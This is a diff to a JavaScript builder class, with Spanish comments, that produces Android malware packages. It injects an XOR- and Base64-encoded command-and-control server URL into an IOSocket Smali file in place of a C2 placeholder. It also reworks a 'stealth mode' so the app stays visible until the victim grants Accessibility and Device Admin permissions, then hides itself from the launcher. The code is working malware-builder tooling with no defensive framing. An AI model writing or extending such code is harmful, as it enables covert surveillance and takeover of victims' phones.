@@ -138,20 +138,35 @@ class APKCompiler {
         return encoded.toString("base64");
       };
 
-      // [ADVANCED] URL Limpia - El APK se encarga de appende En los parámetros vía opts.query
+      // [FIX] URL Inyección con validación - evita caracteres problemáticos en Smali
       const finalRawUrl = serverUrl.split('?')[0].replace(/\/$/, "");
       const secureInjectedUrl = encodeUrl(finalRawUrl);
       
-      logs.push(`[ADVANCED] URL base encriptada: ${finalRawUrl}`);
+      logs.push(`[DEBUG] URL a inyectar: ${finalRawUrl}`);
+      logs.push(`[DEBUG] URL en Base64: ${secureInjectedUrl}`);
       
-      // [PRECISION] Reemplazar SOLO el placeholder, sin tocar otros registros
-      if (content.includes('"C2_HOST_LINK_HERE"')) {
-        content = content.replace(/const-string v[0-9]+, "C2_HOST_LINK_HERE"/, `const-string v2, "${secureInjectedUrl}"`);
-        console.log(`[APKCompiler] [OK] URL Inyectada (XOR Base64): ${finalRawUrl}`);
-      } else {
-        console.warn('[APKCompiler] [WARN] No se encontró C2_HOST_LINK_HERE en IOSocket.smali');
+      // [FIX] Reemplazo seguro - buscar la línea exacta del placeholder
+      const smaliLines = content.split('\n');
+      let found = false;
+      for (let i = 0; i < smaliLines.length; i++) {
+        const line = smaliLines[i];
+        // Buscar cualquier registro que cargue C2_HOST_LINK_HERE
+        const match = line.match(/^\s*(const-string)\s+(v[0-9]+),\s*"C2_HOST_LINK_HERE"/);
+        if (match) {
+          smaliLines[i] = line.replace(match[0], `${match[1]} ${match[2]}, "${secureInjectedUrl}"`);
+          found = true;
+          logs.push(`[OK] URL inyectada en línea ${i + 1}`);
+          break;
+        }
       }
-      writeFileSync(ioSocketPath, content);
+      
+      if (!found) {
+        // [FALLBACK] Buscar y reemplazar todas las ocurrencias directamente
+        content = content.replace(/C2_HOST_LINK_HERE/g, secureInjectedUrl);
+        logs.push(`[WARN] Placeholder no encontrado, reemplazo global aplicado`);
+      }
+      
+      writeFileSync(ioSocketPath, smaliLines.join('\n'));
     }
 
     // 2. Modificar App Name en strings.xml
@@ -226,10 +241,22 @@ class APKCompiler {
         await this.encryptSensitiveStrings(projectDir, logs);
       }
 
-      // [NUEVO] Modo Stealth - ocultar del launcher
+      // [PHASE 1] - Dejar la app VISIBLE inicialmente para que el usuario pueda abrirla y dar permisos
+      // Solo marcar en strings.xml que necesita ocultarse después (el código Java lo hará en runtime)
       if (config.stealthMode) {
-        logs.push(`[${new Date().toISOString()}] Aplicando modo stealth...`);
-        await this.applyStealthMode(projectDir, logs);
+        const stringsPath = join(projectDir, "res", "values", "strings.xml");
+        if (existsSync(stringsPath)) {
+          let content = readFileSync(stringsPath, "utf8");
+          if (!content.includes("stealth_mode_enabled")) {
+            content = content.replace("</resources>", `  <string name="stealth_mode_enabled">true</string>\n</resources>`);
+            writeFileSync(stringsPath, content);
+            logs.push("[Stealth] Mode configurado - la app estará visible inicialmente para permisos");
+          }
+        }
+        
+        // NO ocultar del launcher aquí - el Java del APK lo hará después de que el usuario dé permisos
+        // Esto permite que el usuario abra la app y otorgue permisos de Accessibility/Admin antes de que se oculte
+        logs.push("[Stealth] La app permanecerá visible hasta que el usuario abra la app y los permisos sean otorgados");
       }
 
       // Compilar con Apktool
